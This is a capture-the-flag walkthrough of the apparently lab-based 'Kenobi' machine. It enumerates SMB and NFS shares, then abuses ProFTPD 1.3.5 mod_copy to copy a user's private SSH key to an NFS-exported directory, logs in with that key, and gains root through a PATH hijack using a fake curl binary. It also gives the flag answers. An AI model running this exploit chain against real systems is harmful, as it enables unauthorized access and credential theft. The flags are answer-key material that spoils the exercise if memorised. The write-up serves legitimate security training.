# Kenobi

### Deploy the vulnerable machine

**Scan the machine with nmap, how many ports are open?**

`nmap -sC -v <TARGET-IP> -oN kenobi-nmap`

[Scan results](./kenobi-nmap)

7

### Enumerating Samba for shares

**Using the command above, how many shares have been found?**

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <TARGET-IP>`

[Scan results](./kenobi-nmap-smb-enum)

3

**Connect to the share and list the files on it. What is the file you can see?**

`smbclient //<TARGET-IP>/anonymous`

log.txt

To recursively download the SMB share, run `smbget -R smb://<TARGET-IP>/anonymous`

The log has a few useful things, information generated for Kenobi when generating an SSH key 
for the user and information about the ProFtpd server.

**What port is FTP running on?**

21

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is 
just a server that converts remote procedure call (RPC) program number into universal 
addresses. When an RPC service is started, it tells rpcbind the address at which it is 
listening and the RPC program number its prepared to serve. 

The nmap script scan (-sC) shows that port 111 is acces to a network file system (NFS).

Use `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TARGET-IP>`

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 09:38 GMT
Nmap scan report for 10.10.134.88
Host is up (0.0088s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds

```

**What mount can we see?**

/var

### Gain initail access with ProFtpd

Connect to the machine on FTP port 21 with netcat

`nc <TARGET-IP> 21`

**What is the version?**

1.3.5

Use searchsploit to find any exploits for this version

`searchsploit proftpd`

**How many exploits are there for the ProFtpd version running?**

4

The exploits listed for this version reference the mod_copy module. 

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy 
files/directories from one place to another on the server. Any unauthenticated client can 
leverage these commands to copy files from any part of the filesystem to a chosen 
destination.

Copy Kenobi's SSH key to the NFS directory /var/tmp

```
nc <TARGET-IP> 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [<TARGET-IP>]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Mount the /var/tmp directory to our machine anmd copy the SSH key

```
mkdir /mnt/kenobiNFS
mount <TARGET-IP>:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
```

Change the permissions and use it to log in as kenobi

```
chmod 600 id_rsa
ssh -i id_rsa kenobi@<TARGET-IP>
```

**What is Kenobi's user flag?**

d0b0f3f53b6caa532a83915e19224899

### Privilege Escalation with PATH variable manuipulation

Find the binaries with the SUID bit set `find / -perm -u=s -type f 2>/dev/null`

**What file looks particularly out of the ordinary?**

/usr/bin/menu

**Run the binary, how many options appear?**

3

Run strings on the binary to find any human readable strings within.

```
curl -I localhost
uname -r
ifconfig
```

The binaries are executed without the absolute path and are therefore vulnerable to PATH 
manipulation. 

When you echo the PATH variable it shows that the first directory it will reference is 
/home/kenobi/bin. Run `mkdir /home/kenobi/bin` then create a malicious curl binary and 
place it in the /home/kenobi/bin directory.

```
echo /bin/sh > curl
chmod 777 curl 
mv curl /home/kenobi/bin
```

Run /usr/bin/menu and choose option 1 to gain a root shell

**What is the root flag?**

177b3cd8562289f37382721c28381f02
